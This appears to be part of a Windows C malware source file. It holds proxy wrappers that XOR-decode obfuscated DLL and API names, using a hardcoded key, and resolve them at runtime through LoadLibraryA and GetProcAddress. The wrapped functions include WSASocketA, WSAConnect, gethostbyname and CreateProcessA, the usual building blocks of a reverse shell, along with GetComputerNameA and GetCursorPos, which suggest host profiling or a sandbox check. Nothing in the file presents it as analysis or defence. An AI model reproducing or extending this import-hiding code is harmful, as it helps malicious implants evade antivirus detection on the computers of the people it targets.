    
    HMODULE hWinInet = LoadLibraryA(name_dll);
    pInternetCloseHandle InternetCloseHandleFunc = (pInternetCloseHandle)GetProcAddress(hWinInet, funcName);
    if (InternetCloseHandleFunc != NULL) {
        return InternetCloseHandleFunc(hInternet);
    } else {
        // printf("Error: InternetCloseHandle function not found!\n");
        exit(1);
    }
    FreeLibrary(hWinInet);
}


WINBOOL ProxyGetComputerNameA(LPSTR lpBuffer, LPDWORD nSize) {
    typedef WINBOOL(WINAPI* pGetComputerNameA)(LPSTR, LPDWORD);

    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";

    // char funcName[] = { 'G','e','t','C','o','m','p','u','t','e','r','N','a','m','e','A','\0' };
    char funcName[17] = {0x11, 0x26, 0x33, 0x17, 0x2A, 0x3C, 0x23, 0x39, 0x32, 0x29, 0x23, 0x02, 0x32, 0x29, 0x29, 0x07, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);

    // char name_dll[] = { 'k','e','r','n','e','l','3','2','.','d','l','l','\0' };
    char name_dll[13] = {0x3D, 0x26, 0x35, 0x3A, 0x20, 0x3D, 0x60, 0x7E, 0x68, 0x28, 0x3D, 0x20, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hKernel32 = LoadLibraryA(name_dll);
    pGetComputerNameA GetComputerNameAFunc = (pGetComputerNameA)GetProcAddress(hKernel32, funcName);
    if (GetComputerNameAFunc != NULL) {
        return GetComputerNameAFunc(lpBuffer, nSize);
    } else {
        // printf("Error: GetComputerNameA function not found!\n");
        exit(1);
    }
    FreeLibrary(hKernel32);
}


int ProxyWSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData) {
    typedef int(WINAPI* pWSAStartup)(WORD, LPWSADATA);

    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";

    // char funcName[] = { 'W','S','A','S','t','a','r','t','u','p','\0' };
    char funcName[11] = {0x01, 0x10, 0x06, 0x07, 0x31, 0x30, 0x21, 0x38, 0x33, 0x3C, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);
    
    // char name_dll[] = { 'w','s','2','_','3','2','.','d','l','l','\0' };
    char name_dll[11] = {0x21, 0x30, 0x75, 0x0B, 0x76, 0x63, 0x7D, 0x28, 0x2A, 0x20, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hWs2_32 = LoadLibraryA(name_dll);
    pWSAStartup WSAStartupFunc = (pWSAStartup)GetProcAddress(hWs2_32, funcName);
    if (WSAStartupFunc != NULL) {
        return WSAStartupFunc(wVersionRequested, lpWSAData);
    } else {
        // printf("Error: WSAStartup function not found!\n");
        exit(1);
    }
    FreeLibrary(hWs2_32);
}


SOCKET ProxyWSASocketA(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfoA, GROUP g, DWORD dwFlags) {
    typedef SOCKET(WINAPI* pWSASocketA)(int, int, int, LPWSAPROTOCOL_INFOA, GROUP, DWORD);
    
    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";

    // char funcName[] = { 'W','S','A','S','o','c','k','e','t','A','\0' };
    char funcName[11] = {0x01, 0x10, 0x06, 0x07, 0x2A, 0x32, 0x38, 0x29, 0x32, 0x0D, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);
    
    // char name_dll[] = { 'w','s','2','_','3','2','.','d','l','l','\0' };
    char name_dll[11] = {0x21, 0x30, 0x75, 0x0B, 0x76, 0x63, 0x7D, 0x28, 0x2A, 0x20, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hWs2_32 = LoadLibraryA(name_dll);
    pWSASocketA WSASocketAFunc = (pWSASocketA)GetProcAddress(hWs2_32, funcName);
    if (WSASocketAFunc != NULL) {
        return WSASocketAFunc(af, type, protocol, lpProtocolInfoA, g, dwFlags);
    } else {
        // printf("Error: WSASocketA function not found!\n");
        exit(1);
    }
    FreeLibrary(hWs2_32);
}


struct hostent *Proxy_gethostbyname(const char *name) {
    typedef struct hostent *(WINAPI* p_gethostbyname)(const char *);

    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";

    // char funcName[] = { 'g','e','t','h','o','s','t','b','y','n','a','m','e','\0' };
    char funcName[14] = {0x31, 0x26, 0x33, 0x3C, 0x2A, 0x22, 0x27, 0x2E, 0x3F, 0x22, 0x30, 0x21, 0x36, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);

    // char name_dll[] = { 'w','s','2','_','3','2','.','d','l','l','\0' };
    char name_dll[11] = {0x21, 0x30, 0x75, 0x0B, 0x76, 0x63, 0x7D, 0x28, 0x2A, 0x20, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hWs2_32 = LoadLibraryA(name_dll);
    p_gethostbyname gethostbynameFunc = (p_gethostbyname)GetProcAddress(hWs2_32, funcName);
    if (gethostbynameFunc != NULL) {
        return gethostbynameFunc(name);
    } else {
        // printf("Error: gethostbyname function not found!\n");
        exit(1);
    }
    FreeLibrary(hWs2_32);
}


char *Proxy_inet_ntoa(struct in_addr in) {
    typedef char *(WINAPI* p_inet_ntoa)();
    
    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";

    // char funcName[] = { 'i','n','e','t','_','n','t','o','a','\0' };
    char funcName[10] = {0x3F, 0x2D, 0x22, 0x20, 0x1A, 0x3F, 0x27, 0x23, 0x27, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);

    // char name_dll[] = { 'w','s','2','_','3','2','.','d','l','l','\0' };
    char name_dll[11] = {0x21, 0x30, 0x75, 0x0B, 0x76, 0x63, 0x7D, 0x28, 0x2A, 0x20, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hWs2_32 = LoadLibraryA(name_dll);
    p_inet_ntoa inet_ntoaFunc = (p_inet_ntoa)GetProcAddress(hWs2_32, funcName);
    if (inet_ntoaFunc != NULL) {
        return inet_ntoaFunc(in);
    } else {
        // printf("Error: inet_ntoa function not found!\n");
        exit(1);
    }
    FreeLibrary(hWs2_32);
}


u_short Proxy_htons(u_short hostshort) {
    typedef u_short (WINAPI* p_htons)(u_short);

    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";

    //char funcName[] = { 'h','t','o','n','s','\0' };
    char funcName[6] = {0x3E, 0x37, 0x28, 0x3A, 0x36, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);
    
    // char name_dll[] = { 'w','s','2','_','3','2','.','d','l','l','\0' };
    char name_dll[11] = {0x21, 0x30, 0x75, 0x0B, 0x76, 0x63, 0x7D, 0x28, 0x2A, 0x20, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hWs2_32 = LoadLibraryA(name_dll);
    p_htons htonsFunc = (p_htons)GetProcAddress(hWs2_32, funcName);
    if (htonsFunc != NULL) {
        return htonsFunc(hostshort);
    } else {
        // printf("Error: htons function not found!\n");
        exit(1);
    }
    FreeLibrary(hWs2_32);
}

int Proxy_atoi(const char *_Str) {
    typedef int(WINAPI* p_atoi)(const char *);
    
    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";
    
    // char funcName[] = { 'a','t','o','i','\0' };
    char funcName[5] = {0x37, 0x37, 0x28, 0x3D, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);
    
    // char name_dll[] = { 'm','s','v','c','r','t','.','d','l','l','\0' };
    char name_dll[11] = {0x3B, 0x30, 0x31, 0x37, 0x37, 0x25, 0x7D, 0x28, 0x2A, 0x20, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);

    HMODULE hMsvcrt = LoadLibraryA(name_dll);
    p_atoi atoiFunc = (p_atoi)GetProcAddress(hMsvcrt, funcName);
    if (atoiFunc != NULL) {
        return atoiFunc(_Str);
    } else {
        // printf("Error: atoi function not found!\n");
        exit(1);
    }
    FreeLibrary(hMsvcrt);
}


unsigned long Proxy_inet_addr(const char *cp) {
    typedef unsigned long(WINAPI* p_inet_addr)(const char *);
    
    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";
    
    // char funcName[] = { 'i','n','e','t','_','a','d','d','r','\0' };
    char funcName[11] = {0x3F, 0x2D, 0x22, 0x20, 0x1A, 0x30, 0x37, 0x28, 0x34, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);

    // char name_dll[] = { 'w','s','2','_','3','2','.','d','l','l','\0' };
    char name_dll[11] = {0x21, 0x30, 0x75, 0x0B, 0x76, 0x63, 0x7D, 0x28, 0x2A, 0x20, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hWs2_32 = LoadLibraryA(name_dll);
    p_inet_addr inet_addrFunc = (p_inet_addr)GetProcAddress(hWs2_32, funcName);
    if (inet_addrFunc != NULL) {
        return inet_addrFunc(cp);
    } else {
        // printf("Error: inet_addr function not found!\n");
        exit(1);
    }
    FreeLibrary(hWs2_32);
}


int Proxy_WSAConnect(SOCKET s, const struct sockaddr *name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS) {
    typedef int(WINAPI* pWSAConnect)(SOCKET, const struct sockaddr *, int, LPWSABUF, LPWSABUF, LPQOS, LPQOS);
    
    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";

    // char funcName[] = { 'W','S','A','C','o','n','n','e','c','t','\0' };
    char funcName[11] = {0x01, 0x10, 0x06, 0x17, 0x2A, 0x3F, 0x3D, 0x29, 0x25, 0x38, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);

    //char name_dll[] = { 'w','s','2','_','3','2','.','d','l','l','\0' };
    char name_dll[11] = {0x21, 0x30, 0x75, 0x0B, 0x76, 0x63, 0x7D, 0x28, 0x2A, 0x20, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hWs2_32 = LoadLibraryA(name_dll);
    pWSAConnect WSAConnectFunc = (pWSAConnect)GetProcAddress(hWs2_32, funcName);
    if (WSAConnectFunc != NULL) {
        return WSAConnectFunc(s, name, namelen, lpCallerData, lpCalleeData, lpSQOS, lpGQOS);
    } else {
        // printf("Error: WSAConnect function not found!\n");
        exit(1);
    }
    FreeLibrary(hWs2_32);
}


void *Proxy_memset(void *_Dst, int _Val, size_t _Size) {
    typedef void *(WINAPI* p_memset)(void *, int, size_t);

    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";

    // char funcName[] = { 'm','e','m','s','e','t','\0' };
    char funcName[7] = {0x3B, 0x26, 0x2A, 0x27, 0x20, 0x25, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);
    
    // char name_dll[] = { 'm','s','v','c','r','t','.','d','l','l','\0' };
    char name_dll[11] = {0x3B, 0x30, 0x31, 0x37, 0x37, 0x25, 0x7D, 0x28, 0x2A, 0x20, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);

    HMODULE hMsvcrt = LoadLibraryA(name_dll);
    p_memset memsetFunc = (p_memset)GetProcAddress(hMsvcrt, funcName);
    if (memsetFunc != NULL) {
        return memsetFunc(_Dst, _Val, _Size);
    } else {
        // printf("Error: memset function not found!\n");
        exit(1);
    }
    FreeLibrary(hMsvcrt);
}


BOOL ProxyCreateProcessA(LPCTSTR lpApplicationName, LPTSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCTSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation) {
    typedef BOOL(WINAPI* pCreateProcessA)(LPCTSTR, LPTSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCTSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION);
    
    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";
    
    //char funcName[] = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','A','\0' };
    char funcName[15] = {0x15, 0x31, 0x22, 0x35, 0x31, 0x34, 0x03, 0x3E, 0x29, 0x2F, 0x34, 0x3F, 0x20, 0x05, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);

    //char name_dll[] = { 'k','e','r','n','e','l','3','2','.','d','l','l','\0' };
    char name_dll[13] = {0x3D, 0x26, 0x35, 0x3A, 0x20, 0x3D, 0x60, 0x7E, 0x68, 0x28, 0x3D, 0x20, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hKernel32 = LoadLibraryA(name_dll);
    pCreateProcessA CreateProcessAFunc = (pCreateProcessA)GetProcAddress(hKernel32, funcName);
    if (CreateProcessAFunc != NULL) {
        return CreateProcessAFunc(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
    } else {
        // printf("Error: CreateProcessA function not found!\n");
        exit(1);
    }
    FreeLibrary(hKernel32);
}


WINBOOL ProxyGetCursorPos(LPPOINT lpPoint) {
    typedef WINBOOL(WINAPI* pGetCursorPos)(LPPOINT);
    
    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";

    // char funcName[] = { 'G','e','t','C','u','r','s','o','r','P','o','s','\0' };
    char funcName[13] = {0x11, 0x26, 0x33, 0x17, 0x30, 0x23, 0x20, 0x23, 0x34, 0x1C, 0x3E, 0x3F, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);
    
    // char name_dll[] = { 'u','s','e','r','3','2','.','d','l','l','\0' };
    char name_dll[11] = {0x23, 0x30, 0x22, 0x26, 0x76, 0x63, 0x7D, 0x28, 0x2A, 0x20, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);

    HMODULE hUser32 = LoadLibraryA(name_dll);
    pGetCursorPos GetCursorPosFunc = (pGetCursorPos)GetProcAddress(hUser32, funcName);
    if (GetCursorPosFunc != NULL) {
        GetCursorPosFunc(lpPoint);
    } else {
        // printf("Error: GetCursorPos function not found!\n");
        exit(1);
    }
    FreeLibrary(hUser32);

}

#endif
